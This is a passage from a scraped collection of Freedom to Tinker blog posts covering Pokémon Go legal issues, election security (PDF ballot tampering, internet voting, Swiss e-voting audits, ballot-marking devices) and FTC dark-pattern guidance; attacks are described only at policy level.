In fact, the game is not playable if the player is moving above a certain speed. Furthermore, Pokémon Go has a number of warnings and safeguards against playing while driving or walking at dangerous speeds. A full-screen warning is displayed during loading that warns users against distracted playing. The game’s Terms of Service also includes disclaimers against liability and a warning about Safe Play: “During game play, please be aware of your surroundings and play safely.” PRIVACY Let’s start with the good: Niantic has properly covered the basic privacy law requirements. The app includes clearly visible links to their privacy policy, which is also written clearly and (relatively) understandably. The privacy policy includes the necessary information, for both U.S. and E.U. users. Niantic has taken the necessary steps to protect children’s privacy as well. And now for the possibly less-good: Early on, players noticed a concerning privacy setting that effectively allowed Niantic access and control over players’ Google accounts. Niantic quickly fixed this problem and removed the access controls in an update. It’s likely that this level of Google account control was a holdover from the days when Niantic was still under the Google umbrella. I would chalk this up as a wash for Niantic, as the privacy concern was resolved fairly quickly. Now, the real concern here is that the app takes in a lot of information. A lot of information. Some of it is personally identifiable information (like your name and email address). Some of it is user-submitted, like names you give to the forty Rattattas you catch in one day, because even the Pokémon in Manhattan are mostly rats and pigeons. Pokemon Go collects so much information that Senator Al Franken was inspired to publish a letter to Niantic demanding more clarity on the game’s privacy protections. The most concerning privacy issue with this app is the constant tracking of location data. Some of these concerns were already noted, to less fanfare, with the release of Ingress, the precursor to Pokémon Go. By agreeing to the Pokémon Go privacy policy, you explicitly agree to allow Niantic to track your location any time you use the app. Most players leave the app open at all times, waiting for that sweet, sweet buzz of a new wild Pokémon appearing. This means that, effectively, you give permission for Niantic to track your movements all day, every day, wherever you go. Niantic also does not provide much information on how your data can be shared. The privacy policy allows Niantic to “share aggregated information and non-identifying information with third parties for research and analysis, demographic profiling, and other similar purposes.” This means data on your daily commute can be sold to marketing companies to better market to you, the consumer. Niantic promises not to share any of this data without aggregating the data (grouping it together with others’ data) and stripping it of identifying information (your name, email, etc.). These problems may sound concerning at first. However, if you are upset about your information being monetized, it’s probably too late. Pokémon Go is a low level offender in this category, as basically all the apps on your phone and computer can and do track you now. (As do your store customer loyalty cards, your credit cards, your television, your, your thermostat, and sometimes even your clothing.) The app has access to a lot of data, including location data, movement data, and potentially photographs. This information, in the wrong hands, could lead to a privacy nightmare for users. INTELLECTUAL PROPERTY Pokémon Go’s locations use photos and names taken from Ingress, which includes crowdsourced photos, names, and locations crowdsourced by Ingress users. Both games operate based on data from Google Maps. Whether Niantic can use photos of landmarks in the Pokémon Go game is a legal grey area. In the United States, there exists a “freedom of panorama” exception to copyright law. This exception allows for free use of photos and videos of buildings (and sometimes sculptures and other works) that are located in public spaces. For example, a mural on a building would fall under this exception, and photographers could freely take photos of that mural. If the mural became a Pokéstop in Pokémon Go, the app could freely use a photo of that mural in the app. However, freedom of panorama sometimes does not extend to other works of art visible in public spaces. This could include sculptures and artworks, some of which are used as locations with photos in Pokémon Go. Another potential intellectual property issue is whether trademark owners can sue for Niantic’s use of their marks in the game. These trademarks could include, say, the name of a store or mural used as a landmark. However, use of a trademark to denote location or origin is generally legally permissible as “fair use” under U.S. trademark law. AUGMENTED REALITY One of the most popular features of Pokémon Go is the app’s use of augmented reality. When a wild Pokémon appears, you can choose to see the Pokémon actually in your real life surroundings (as seen through your phone camera). You then attempt to catch it (in my case, mostly after many, many tries), while the Pokémon dances on-screen in your kitchen sink, on your friend’s head, on the dashboard of your car, etc. Augmented reality is not a new concept, but use in games is still not widespread. However, there are some intriguing legal issues related to augmented reality, as noted in this primer by the University of Washington’s Tech Policy Lab. It remains to be seen how augmented reality apps, including Pokémon Go, affect the legal landscape of what the Tech Policy Lab notes as the major legal issues at play with AR: “privacy, free speech, and intellectual property as well as novel forms of distraction and discrimination.” VIRTUAL CURRENCY Currently, players can purchase in-game items through a micro-transaction process that should be familiar to any mobile game consumer. Eventually, the game will likely allow players to trade Pokémon as well, and perhaps items. The more the game allows for purchases and trades, whether between player and in-game store or between player and player, the more potential there is for legal issues regarding virtual currencies in mobile gaming. There is a wide range of legal issues at play with virtual currencies, from consumer fraud to international money laundering to material support of terrorism (seriously). TRESPASS Niantic’s Terms of Service explicitly calls out trespass. Trespass, generally, is the act of knowingly entering another person’s property without permission. By using the app, you agree to not commit trespass, and Niantic excuses themselves from liability concerning your or any other users’ trespass onto private property. Disclaimers, especially in fine print Terms of Service like this, are not bulletproof protections for companies. It’s possible that, say, a homeowner could sue Niantic for negligence in allowing for trespass to occur, but it would be much easier (though probably much less lucrative) to sue the trespasser directly. However, trespass may not be a big issue with this game. Generally, if you see a Pokestop, gym, or wild Pokémon, you can interact with the location without being right next to it. Of course, there may be some exceptions. Many of the locations were taken directly for the crowdsourced landmarks of Ingress, and some of these gyms and Pokestops may be within the bounds of privately owned property. Let’s be clear: Even if a Mewtwo appears in your neighbor’s yard, you are still not allowed to trespass on private property to get it. CONCLUSION This is not an exhaustive list of every legal possibility inherent in the Pokémon Go world. These are just some of the legal issues at play when users, well, play. While this may seem like a long list of potential legal problems, the reality is that any mobile game will have a host of legal issues involved. What’s important here is that users are informed of their rights, which Niantic does its best to achieve through in-game warnings and explicit provisions in their Terms of Service and Privacy Policy. While I can’t give you legal advice here, I can say that, as a technology attorney with substantial experience researching privacy and intellectual property, I personally have no qualms playing the game. Just try not to fall off a cliff while playing. It’s not worth it, unless there really is a Mewtwo at the bottom of that cliff – in which case, where is that cliff, exactly? Recommended Reading: Beth Hill, IAPP Privacy Advisor, “The important privacy lessons from ‘Pokemon Go'” Jedidiah Bracy, IAPP Privacy Advisor, “Pokémon GO, augmented reality, and privacy” Gabriella Ziccarelli, Baltimore Sun, “The Price of Pokemon Go” James Rogers, Fox News, “Death by Pokemon? Public safety fears mount as ‘Pokemon GO’ craze continues” Rachel Dicker, US News & World Report, “Could Pokemon Go Break Election Laws?” National Constitution Center, “Pokemon Go shines new attention on trespass laws” Keith Lee, Associate’s Mind, “Is Pokemon Go Illegal?” Brian D. Wassom, Hollywood Reporter, “How Pokémon GO Players Could Run Into Real-Life Legal Problems” Natasha Lomas, TechCrunch, “Pokemon Go T&Cs strip users of legal rights” University of Washington Tech Policy Lab, Augmented Reality Technology Policy Primer Tiffany Li is a CITP Affiliate and Commercial Counsel at General Assembly, the global education company. She is also an Internet Law & Policy Foundry Fellow. Opinions expressed in this article are those of the author and do not necessarily reflect those of her employer or any other entity. Twitter: @tiffanycli"
"91","2022-05-19","2023-03-24","https://freedom-to-tinker.com/2022/05/19/a-pdf-file-is-not-paper-so-pdf-ballots-cannot-be-verified/","A new paper by Henry Herrington, a computer science undergraduate at Princeton University, demonstrates that a hacked PDF ballot can display one set of votes to the voter, but different votes after it’s emailed – or uploaded – to election officials doing the counting. For overseas voters or voters with disabilities, many states provide “Remote Accessible Vote By Mail,” or RAVBM, a system that allows voters the ability to download and print an absentee ballot, fill it out by hand on paper, and physically mail it back. Some states use commercial products, while others have developed their own solutions. In general, this form of RAVBM can be made adequately secure, mainly because the voters make their own marks on the paper. In some forms of RAVBM, the voter can fill out the ballot using an app on their computer before printing and mailing it. This is less secure: if malware on the voter’s computer has “hacked” the voting app, what’s printed out may differ from what the voter indicated on the screen, and voters are not very good at reviewing the printouts and noticing such changes. The most dangerous form of RAVBM is one that allows electronic ballot return, in which the voter uploads or emails a PDF file. Thirty states allow overseas voters to do electronic ballot return, either by email, fax, or web-portal upload, as shown in Table 5 (pages 34-35) of Herrington’s longer paper, Ballot Acrobatics: Altering Electronic Ballots using Internal PDF Scripting. The danger is that malware on the voter’s computer could send a different PDF file than the one that the voter has viewed and verified. A hacker who wanted to steal an election could propagate such malware to thousands of voters’ computers. The malware could alter the operation of the voting app, the PDF viewer, the browser, or the email/upload software. There is a clear scientific consensus on this: According to “Securing the Vote, Protecting American Democracy,” a 2018 report released by the National Academies of Sciences, Engineering, and Medicine: the internet “should not be used for the return of marked ballots . . . as no known technology guarantees the secrecy, security, and verifiability of a marked ballot transmitted over the Internet.” Electronic ballot return is promoted by technology vendors, Democracy Live and Voatz; and by Nevada, with its own EASE, system, which gives voters “the option of saving the ballot materials as a PDF file and emailing the document as an attachment to the respective county clerk or registrar’s office.” Democracy Live uses OmniBallot, an electronic method of delivering and returning ballots. In all of these cases, the “final” ballot that the voter reviews is a PDF file.* The election-app vendors are implicitly relying on your intuition that “it’s a document” and we humans think we can read a document. At 8:32 in this Democracy Live promotional video, “this ballot happens to be a document.” Clearly, in the video, it’s a PDF, viewed in a PDF viewer, and from Specter and Halderman (2021) we know it’s a PDF. It’s dangerous enough that the PDF you view may not be the PDF that’s transmitted to the election administrator. But even if it were the same PDF file, what you see now is not necessarily what you get later. A recent article by Herrington, “Altering Electronic Ballots Using PDF Scripting,” contains a live demonstration (on page 2) of a PDF ballot that changes what votes are marked from one minute to the next. Of course, a real election hacker wouldn’t produce a PDF whose votes change every minute; the voter might notice that. The real threat model is between verification time and vote counting time. Herrington demonstrates a minute-by-minute change for the convenience of his readers. A voter might mark a ballot using the EASE, Voatz, or Democracy Live app provided by their county election office, then inspect it using a browser or PDF viewer: By inspecting the ballot, the voter might think they have verified their selection of candidates. Then they email or upload this PDF ballot, as instructed. But when the election administrator processes that very same PDF file to count the votes, the filled-in oval has moved from one name to another: The vote has been hacked! PDF files are not static; they contain active program software. If a hacker has infected thousands of voters’ home computers with vote-stealing malware, that malware can corrupt the operation of the official ballot-marking app to produce dynamic PDF files. You might think, “my computer probably isn’t hacked, so I’ll take that risk.” But the real risk is not only your computer. A hacker can spread the same malware to the computers of thousands of your fellow citizens, and steal their votes in that same election—and the election result can be altered. That’s not democracy, that’s hackocracy. In conclusion: Mark your ballots on physical paper. And tell your state and local election officials not to adopt electronic ballot return. For example, you can refer them to this 2020 report of the U.S. Cybersecurity and Infrastructure Security Agency (CISA), which says, “Electronic ballot return is high risk. Electronic ballot return, the digital delivery of a voted ballot back to the election authority, faces significant security risks to voted ballot integrity, voter privacy, and system availability. There are no compensating controls to manage electronic ballot return risk using current technologies. While many risks associated with electronic ballot return have a physical analog with the risk associated with the mailing of ballots, the comparison can miss that electronic systems provide the opportunity to rapidly affect voting at scale.” *The use of PDF for this purpose in Democracy Live and Voatz is confirmed by independent peer-reviewed analysis: (1) Specter, Michael, and J. Alex Halderman. “Security analysis of the Democracy Live online voting system.” 30th USENIX Security Symposium (USENIX Security 21), 2021; and (2) Specter, Michael A., James Koppel, and Daniel Weitzner. “The Ballot is Busted Before the Blockchain: A Security Analysis of Voatz, the First Internet Voting Application Used in US Federal Elections.” 29th USENIX Security Symposium (USENIX Security 20), 2020; and, (3) the use of PDF in EASE is stated in plain language on Nevada’s web site."
"92","2018-09-11","2023-03-24","https://freedom-to-tinker.com/2018/09/11/securing-the-vote-national-academies-report/","In this November’s election, could a computer hacker, foreign or domestic, alter votes (in the voting machine) or prevent people from voting (by altering voter registrations)? What should we do to protect ourselves? The National Academies of Science, Engineering, and Medicine have released a report, Securing the Vote: Protecting American Democracy about the cybervulnerabilities in U.S. election systems and how to defend them. The committee was chaired by the presidents of Indiana University and Columbia University, and the members included 5 computer scientists, a mathematician, two social scientists, a law professor, and three state and local election administrators. I served on this committee, and I am confident that the report presents the clear consensus of the scientific community, as represented not only by the members of the committee but also the 14 external reviewers—election officials, computer scientists, experts on elections—that were part of the National Academies’ process. The 124-page report, available for free download, lays out the scientific basis for our conclusions and our 55 recommendations. We studied primarily the voting process; we did not address voter-ID laws, gerrymandering, social-media disinformation, or campaign financing. There is no national election system in the U.S.; each state or county runs its own elections. But in the 21st century, state and local election administrators face new kinds of threats. In the 19th and 20th centuries elections did not face the threat of vote manipulation (and voter-registration tampering) from highly sophisticated adversaries anywhere in the world. Most state and local election administrators know they must improve their cybersecurity and adopt best practices, and the federal government can (and should) offer assistance. But it’s impossible to completely prevent all attacks; we must be able to run elections even if the computers might be hacked; we must be able to detect and correct errors in the computer tabulation. Therefore, our key recommendations are, 4.11. Elections should be conducted with human-readable paper ballots. These may be marked by hand or by machine (using a ballot-marking device); they may be counted by hand or by machine (using an optical scanner). Recounts and audits should be conducted by human inspection of the human-readable portion of the paper ballots. Voting machines that do not provide the capacity for independent auditing (e.g., machines that do not produce a voter-verifiable paper audit trail) should be removed from service as soon as possible. In our report, we explain why: voting machines can never be completely hack-proof, but with paper ballots we can–if we have to–count the votes independent of possibly hacked computers. 4.12. Every effort should be made to use human-readable paper ballots in the 2018 federal election. All local, state, and federal elections should be conducted using human-readable paper ballots by the 2020 presidential election. 5.8. States should mandate risk-limiting audits prior to the certification of election results. With current technology, this requires the use of paper ballots. States and local jurisdictions should implement risk-limiting audits within a decade. They should begin with pilot programs and work toward full implementation. Risk-limiting audits should be conducted for all federal and state election contests, and for local contests where feasible. In our report, we explain why: examining a small random sample of the paper ballots, and comparing with the results claimed by the computers, can assure with high confidence that the computers haven’t been hacked to produce an incorrect outcome–or else, can provide clear evidence that a recount is needed. 5.11. At the present time, the Internet (or any network connected to the Internet) should not be used for the return of marked ballots. Further, Internet voting should not be used in the future until and unless very robust guarantees of security and verifiability are developed and in place, as no known technology guarantees the secrecy, security, and verifiability of a marked ballot transmitted over the Internet. 4.1. Election administrators should routinely assess the integrity of voter registration databases and the integrity of voter registration databases connected to other applications. They should develop plans that detail security procedures for assessing voter registration database integrity and put in place systems that detect efforts to probe, tamper with, or interfere with voter registration systems. States should require election administrators to report any detected compromises or vulnerabilities in voter registration systems to the U.S. Department of Homeland Security, the U.S. Election Assistance Commission, and state officials. Many of these recommendations are not controversial, in most states. Almost all the states use paper ballots, counted by machine; the few remaining states that use paperless touchscreens are taking steps to move to paper ballots; the states have not adopted internet voting (except for scattered ill-advised experiments); and many, many election administrators nationwide are professionals who are working hard to come up to speed on cybersecurity. But many election administrators are not sure about risk-limiting audits (RLAs). They ask, “can’t we just audit the digital ballot images that the machines provide?” No, that won’t work: if the machine is hacked to lie about the vote totals, it can easily be hacked to provide fake digital pictures of the ballots themselves. The good news is, well designed risk-limiting audits, added to well-designed administrative processes for keeping track of batches of ballots, can be efficient and practical. But it will take some time and effort to get things going: the design of those processes, the design of the audits themselves, training of staff, state legislation where necessary. And it can’t be a one-size-fits-all design: different states vote in different ways, and the risk-limiting audit must be designed to fit the state’s election systems and methods. That’s why we recommend pilots of RLAs as soon as possible, but a 10-year period for full adoption. Many other findings and recommendations are in the report itself. For example, Congress should fully fund the Election Assistance Commission to perform its mission, authorize the EAC to set standards for voter-registration systems and e-pollbooks (not just voting machines); the President should nominate and Congress should confirm EAC commissioners. But the real bottom line is: there are specific things we can do, at the state level and at the national level; and we must do these things to secure our elections so that we are confident that they reflect the will of the voters."
"93","2022-06-30","2023-03-24","https://freedom-to-tinker.com/2022/06/30/what-the-assessments-say-about-the-swiss-e-voting-system/","(Part 4 of a 5-part series starting here) In 2021 the Swiss government commissioned several in-depth technical studies of the Swiss Post E-voting system, by independent experts from academia and private consulting firms. They sought to assess, does the protocol as documented guarantee the security called for by Swiss law (the “ordinance on electronic voting”, OEV)? Does the system as implemented in software correctly correspond to the protocol as documented? Are the networks and systems, on which the system is deployed, adequately secure? Before the reports even answer those questions, they point out: “the engineers who build the system need to do a better job of documenting how the software, line by line, corresponds to the protocol it’s supposed to be implementing.” That is, this kind of assessment can’t work on an impenetrable black-box system; the Swiss Post developers have made good progress in “showing their work” so that it can be assessed, but they need to keep improving. And this is a very complex protocol, and system, because it’s attempting to solve a very difficult problem: conduct an election securely even though some of the servers and most of the client computers may be under the control of an adversary. The server-side solution is to split the trust among several servers using a cryptographic consensus protocol. The client-side solution is what I described in the previous post: even if the client computer is hacked, it’s not supposed to be able to succeed in cheating because there are certain secrets that it can’t see, printed on the paper and only visible to the voter. Now, does the voting protocol work in principle? The experts on cryptographic voting protocols say, “The Swiss Post e-voting system protocol documentation, code and security proofs show continuing improvement. The clarity of the protocol and documentation is much improved on earlier versions [which] has exposed many issues that were already present but not visible in the earlier versions of the system; this is progress. … There are, at present, significant gaps in the protocol specification, verification specification, and proofs. … [S]everal of the issues that we found require structural changes …. ” And, is the system architecture secure? The expert on system security says, “the SwissPost E-voting system [has] been evolving … for well over a decade. … The current generation of the system under audit takes many important and valuable measures for security and transparency that are to this author’s knowledge unprecedented or nearly-unprecedented among governmental E-voting programs worldwide. At a technical level, these measures include individual and universal verifiability mechanisms, trust-splitting of critical functions across four control components, the incorporation of an independent auditor role in the E-voting process, and the adoption of a reproducible build process for the E-voting software. [I see] ample evidence overall of both a system and a development process represent[ing] an exemplar that other governments worldwide should examine closely, learn from, and adopt similar state-of-the-art practices where appropriate.” But on the other hand, he says, “the current system under audit is still far from the ideal system that … perhaps any expert well-versed in this technology domain – would in principle like to see. Some issues [include] the current system’s reliance on a trusted and fully-centralized printing authority, and its exclusion of coercion or vote-buying as a risk to be taken seriously and potentially mitigated. [And] Explicit documentation of the architecture’s security principles and assumptions, and how the concrete system embodies them, is still incomplete or unclear in many respects … The architecture’s trust-splitting across four control components strengthens vote privacy, but does not currently strengthen either end-to-end election integrity or availability … The architecture critically relies on an independent auditor for universal verifiability, but the measures taken to ensure the auditor’s independence appear incomplete … While the system’s abstract cryptographic protocol is well-specified and rigorously formalized, the security of the lower-level message-based interactions between the critical devices – especially the interactions involving offline devices – do not yet appear to be fully specified or analyzed.” In conclusion, the cryptographic-protocol experts recommend, “We encourage the stakeholders in Swiss e-voting to allow adequate time for the system to thoroughly reviewed before restarting the use of e-voting,” while the system-security expert concludes, “as imperfect as the current system might be when judged against a nonexistent ideal, the current system generally appears to achieve its stated goals, under the corresponding assumptions and the specific threat model around which it was designed.” In the next part of this series: Threats that the experts didn’t think of."
"94","2022-06-27","2023-03-24","https://freedom-to-tinker.com/2022/06/27/how-to-assess-an-e-voting-system/","Part 1 of a 5-part series If I can shop and bank online, why can’t I vote online? David Jefferson explained in 2011 why internet voting is so difficult to make secure, I summarized again in 2021 why internet voting is still inherently insecure, and many other experts have explained it too. Still, several countries and several U.S. states have offered e-voting to some of their citizens. In many cases they plunge forward without much consideration of whether their e-voting system is really secure, or whether it could be hacked to subvert democracy. It’s not enough just to take the software vendor’s word for it. Switzerland is a country that wanted to do it right, fumbled, and in the process learned that an important part of getting it right is a careful (and expensive) study, that’s independent of the vendor selling the system, and independent of the governmental body that’s purchasing the system. The study wasn’t particularly expensive—about half a million Swiss francs, which is about half a million US dollars—but that’s half a million that most U.S. states or other countries have not spent before rushing to deploy a system. After the study, the Swiss government’s conclusion was, “The e-voting system currently being developed by Swiss Post has been significantly improved. However, further developments, some of them substantial, are still required.” In 2000 the Swiss Parliament directed the Federal Chancellery to study the feasibility of e-voting, and based on those studies, several cantons (the “counties” or “states” of Switzerland) experimented with pilots starting about 2010. In 2019 the Swiss Post (the national post office) deployed a system based on cryptographic “mixnets” that were supposed to assure that only authorized votes were cast while also preserving the secret ballot. Mixnets are a decades-old scientific idea for e-voting, to enable voters to check that their vote has been counted, while preserving the secret ballot (so voters can’t prove to anyone else how they voted). Pretty soon, four scientists (from Norway, Canada, Belgium, and Australia) published a paper showing that the cryptographic design of the Swiss Post mixnet was flawed, allowing opportunities for undetectable fraud. In July 2019, Swiss Post ceased offering its system to the cantons. The Federal Chancellery was commissioned to work with the cantons to redesign the trial phase of e-voting. The Chancellery than commissioned independent scientists to do several separate studies: • A cryptographic protocol study of the theoretical design, by experts in cryptography; • A systems security study of the software itself, by an expert in operating systems security; • Infrastructure and operation of the Swiss Post in running the system; and • Network security of the e-voting infrastructure. I’ve read some of those reports, and they’re very good. The scientists in question are world-renowned in their specific fields of expertise. They were able to ask for clarifications and explanations from the software architects at Swiss Post. The Chancellery estimates that these “independent experts … commissioned to conduct the examinations” will cost up to a million Swiss francs, by the time these and the next round of studies are complete (see B.1 on pages 41-42 of this report). That may seem like a lot, but in reading these reports it’s clear that a lot of time and effort went into them—cryptographic protocols and software systems are complicated, and analyzing them takes a lot of time. If you want to read the System Architecture documentation and the source code for yourself, Swiss Post has made it all available in a public repository. That kind of transparency is admirable. For the Australian State of New South Wales, for France, for those U.S. states that permit internet ballot return for voters living abroad, my question is this: Why did you adopt an e-voting system just on the say-so of the system vendor? Where is your independent scientific study by world-class experts? Where is your million-dollar budget item to assess the system before imposing its insecurities on the public, on the candidates, upon democracy itself? Because most likely the system you adopted is even less secure than the Swiss Post system, the one that Switzerland decided to pause and revamp. Coming next in Part 2: How Not to Assess an E-voting System, by Vanessa Teague"
"95","2021-04-27","2023-03-24","https://freedom-to-tinker.com/2021/04/27/internet-voting-is-still-inherently-insecure/","Legislation for voting by internet is pending in Colorado, and other states have been on the verge of permitting ballots to be returned by internet. But voting by internet is too insecure, too hackable, to use in U.S. elections. Every scientific study comes to the same conclusion—the Defense Department’s study group in 2004, the National Academy of Sciences in 2018, and others. Although the internet has evolved, the fundamental insecurities are the same: insecure client computers (your PC or phone), insecure servers (that collect the votes), and Americans’ lack of universal digital credentials. Vendors of internet voting systems claim it’s different now: they claim “online voting” is not “internet voting”; they say smartphones are not PCs, cloud-computing systems are more secure than privately hosted servers, dedicated apps are not web sites, and because blockchain. So let’s examine the science. Of course “online voting” is internet voting: your smartphones and laptops connect to servers and cloud servers through the public packet-switched network; even the phone network these days is part of the internet. And if the voter sends a ballot electronically to an election office that prints and counts it, that’s certainly not a “paper ballot” in the sense that a voter can check what’s printed on it. Smartphones are client computers on that same internet. Smartphone operating systems (Apple’s iOS and Google’s Android) have improved their security in recent years, but serious new exploitable vulnerabilities are continually discovered: about 25 per year in iOS (2018-2020) and 103 per year in Android. And there are an unknown number of undiscovered vulnerabilities that attackers may be exploiting. If you prepare a ballot on your smartphone voting for candidate Smith, you cannot be sure whether a hacker has caused your voting app to transmit instead a vote for Jones. Major cloud-computing providers such as AWS and Azure do a good job of securing their systems for the companies that they “host” (banks, retailers, voting apps). But a bank or voting-app maker must write their own software to run in that cloud. It’s difficult to get that software right, and bugs can lead to exploitable vulnerabilities that a hacker could use to change votes as they arrive. AWS is not some sort of magical pixie dust that one sprinkles on software to make it unhackable. Blockchain doesn’t help either: the vote can be hacked before it even gets into the blockchain. We have no system of unforgeable digital credentials that we can give to every voter to authenticate their voting transaction. In practice, internet-voting products marketed in 2020 (from Voatz and Democracy Live) contracted out digital authentication to privacy-invasive third-party companies who asked voters to hold up their driver’s license next to their face and take a picture, or captured “browser fingerprints” tracking personal information about the voter’s Web usage—revealing this and much other private information about the voter and the voter’s votes to these unaccountable third-party companies. Traffic in stolen credentials would seriously compromise elections. We still do online banking and shopping. But banks have control over to whom they issue credit cards; can suspend a credit card at any instant if they suspect fraud; can decide what percentage of fraud they want to tolerate, balancing against convenience. And most important, every individual transaction is traceable and auditable. But with voting, none of those are true. You have the right to the secret ballot, with an assurance that the system doesn’t know who you voted for. The groups pressing hardest for internet voting are national organizations representing voters with disabilities. They want voters with visual impairments or motor disabilities to be able to vote independently and conveniently from home. Indeed, although every polling place (by federal law since 2002) has an “accessible” voting-machine to accommodate voters with disabilities, many of those machines are so ill-designed that they are accessible in name only. We need better technology for such voters, and it’s worth investing in it. There really are better accessible voting machines on the market for use in polling places and early vote centers, and more research would help too. But we must not let wishful thinking lead us into hackable internet voting. Wishing that internet voting could be made secure is not a justification for implementing it. And in fact, surveys of voters with disabilities show that the vast majority want to vote on paper. The clear consensus of computer scientists and cybersecurity experts is that paperless voting systems cannot be made sufficiently secure for use in public elections. Paper ballots are our only practical choice—countable by machine, recountable by hand in case the machines were hacked or misconfigured, and auditable by hand to detect whether a recount is warranted."
"96","2022-07-21","2023-03-24","https://freedom-to-tinker.com/2022/07/21/magical-thinking-about-ballot-marking-device-contingency-plans/","The Center for Democracy and Technology recently published a report, “No Simple Answers: A Primer on Ballot Marking Device Security”, by William T. Adler. Overall, it’s well-informed, clearly presents the problems as of 2022, and it’s definitely worth reading. After explaining the issues and controversies, the report presents recommendations, most of which make a lot of sense, and indeed the states should act upon them. But there’s one key recommendation in which Dr. Adler tries to provide a simple answer, and unfortunately his answer invokes a bit of magical thinking. This seriously compromises the conclusions of his report. By asking but not answering the question of “what should an election official do if there are reports of BMDs printing wrong votes?”, Dr. Adler avoids having to make the inevitable conclusion that BMDs-for-all-voters is a hopelessly flawed, insecurable method of voting. Because the answer to that question is, unfortunately, there’s nothing that election officials could usefully do in that case. BMDs (ballot marking devices) are used now in several states and there is a serious problem with them (as the report explains): “a hacked BMD could corrupt voter selections systematically, such that a candidate favored by the hacker is more likely to win.” That is, if a state’s BMDs are hacked by someone who wants to change the result of an election, the BMDs can print ballots with votes on them different from what the voters indicated on the touchscreen. Because most voters won’t inspect the ballot paper carefully enough before casting their ballot, most voters won’t notice that their vote has been changed. The voters who do notice are (generally) allowed to “spoil” their ballot and cast a new one; but the substantial majority of voters, those who don’t check their ballot paper carefully, are vulnerable to having their votes stolen. One simple answer is not to use BMDs at all: let voters mark their optical-scan paper ballots with a pen (that is, HMPB: hand-marked paper ballots). A problem with this simple answer (as the report explains) is that some voters with disabilities cannot mark a paper ballot with a pen. And (as the report explains) if BMDs are reserved just for the use of voters with disabilities, then those BMDs become “second class”: pollworkers are unfamiliar with how to set them up, rarely used machines may not work in the polling place when turned on, paper ballots cast by the disabled are distinguishable from those filled in with a pen, and so on. So Dr. Adler seems to accept that BMDs, with their serious vulnerabilities, are inevitably going to be adopted—and so he makes recommendations to mitigate their insecurities. And most of his recommendations are spot-on: incorporate the cybersecurity measures required by the VVSG 2.0, avoid the use of bar codes and QR codes, adopt risk-limiting audits (RLAs). Definitely worth doing those things, if election officials insist on adopting this seriously flawed technology in the first place. But then he makes a recommendation intended to address the problem that if the BMD is cheating then it can print fraudulent votes that will survive any recount or audit. The report recommends, Another way is to depend on voter reports. In an election with compromised BMDs modifying votes in a way visible to voters who actively verify and observe those modifications, it is likely that election officials would receive an elevated number of reported errors. In order to notice a widespread issue, election officials must be monitoring election errors in real-time across a county or state. If serious problems are revealed with the BMDs that cast doubt on whether votes were recorded properly, either via parallel testing or from voter reports, election officials must respond. Accordingly, election officials should have a contingency plan in the event that BMDs appear to be having widespread issues. Such a plan would include, for instance, having the ability to substitute paper ballots for BMDs, decommissioning suspicious BMDs, and investigating whether other machines are also misbehaving. Stark (2019) has warned, however, that because it is likely not possible to know how many or which ballots were affected, the only remedy to this situation may be to hold a new election. This the magical thinking: “election officials should have a contingency plan.” The problem is, when you try to write down such a plan, there’s nothing that actually works! Suppose the election officials rely on voter reports (or on the rate of spoiled ballots); suppose the “contingency plan” says (for example) says “if x percent of the voters report malfunctioning BMDs, or y percent of voters spoil their ballots, then we will . . .” Then we will what? Remove those BMDs from service in the middle of the day? But then all the votes already cast on those BMDs will have been affected by the hack; that could be thousands of votes. Or what else? Discard all the paper ballots that were cast on those BMDs? Clearly you can’t do that without holding an entirely new election. And what if those x% or y% of voters were fraudulently reporting BMD malfunction or fraudulently spoiling their ballots to trigger the contingency plan? There’s no plan that actually works. Everything I’ve explained here was already written down in “Ballot-marking devices cannot ensure the will of the voters” (2020 [non-paywall version]) and in “There is no reliable way to detect hacked ballot-marking devices” (2019), both of which Dr. Adler cites. But an important purpose of magical thinking is to avoid facing difficult facts. It’s like saying, “to prevent climate change we should just use machines to pull 40 billion tons of CO2 out of the atmosphere each year.” But there is no known technology that can do this. All the direct-air-capture facilities deployed to date can capture just 0.00001 billion tons. Just because we really, really want something to work is not enough. There is an inherent problem with BMDs: they can change votes in a way that will survive any audit or recount. Not only is there “no simple solution” to this problem, there’s no solution period. Perhaps someday a solution will be identified. Until then, BMDs-for-all-voters is dangerous, even with all known mitigations."
"97","2022-08-10","2023-03-24","https://freedom-to-tinker.com/2022/08/10/recommendations-for-updating-the-ftcs-disclosure-guidelines-to-combat-dark-patterns/","Last week, CITP’s Tech Policy Clinic, along with Dr. Jennifer King, brought leading interdisciplinary academic researchers together to provide recommendations to the Federal Trade Commission on how it should update the 2013 version of its online digital advertising guidelines (the “Disclosure Guidelines”). This post summarizes the comment’s main takeaways. We focus on how the FTC should address the growing problem of “dark patterns,” also known as “manipulative designs.” Dark patterns are user interface techniques that benefit an online service by leading consumers into making decisions they might not otherwise make. Some dark patterns deceive consumers, while others exploit cognitive biases or shortcuts to manipulate or coerce them into choices that are not in their best interests. Dark patterns have been an important focus of research at CITP, as noted in two widely cited papers, “Measurement Methods and Dark Patterns at Scale: Findings from a Crawl of 11K Shopping Websites,” and “What Makes a Dark Pattern… Dark?: Design Attributes, Normative Considerations.” As documented in several research studies, consumers may encounter dark patterns in many online contexts, such as when making choices to consent to the disclosure of personal information or to cookies, when interacting with services and applications like games or content feeds that seek to capture and extend consumer attention and time spent, and in e-commerce, including at multiple points along a purchasing journey. Dark patterns may start with the advertising of a product or service, and can be present across the whole customer path, including sign-up, purchase, and cancellation. Given this landscape, we argue that FTC should provide guidance that covers the business’s entire interaction with the consumer to ensure that they are allowed to engage in free and informed transactions. Importantly, we highlight why the guidance needs to squarely address the challenge that providing additional disclosures, standing alone, will not cure the harms caused by a number of dark patterns. Our key recommendations include the following: Offer consumers symmetric choices at crucial decision-making points. And offer that parity for crucial decision-making points across different modes of accessing the service so that consumers can exercise the same choices whether they are using web applications, mobile applications, or new forms of augmented reality applications. Do not preselect choices that favor the interest of the service provider at the expense of the consumer. Disclose material information in a manner that allows consumers to make informed decisions. Consider a heightened requirement to present information in a manner that serves the best interest of the consumer at critical decision points. Follow ethical design principles when designing their interfaces. Such principles include taking account how different demographics, especially vulnerable populations, may interact with an interface by testing the usability and comprehensibility of interfaces across the different demographics. Disclose if and when businesses use personal data to shape the online choice architecture for users. Our comments also draw attention to how consumer protection authorities across different countries are addressing dark patterns. While each jurisdiction operates in its unique context, there is a growing set of strategies to counteract the negative effects of dark patterns that are worth drawing lessons from as the FTC develops its own guidance. We also caution that legalistic, long form disclosures are not read or understood by the average consumer. In other words, relying on boilerplate disclosures alone will not cure most dark patterns. Instead, we point to studies that demonstrate how disclosures shown close to the time of the decision and relevant to that decision are a lot more effective in educating consumers about their choices. As a way 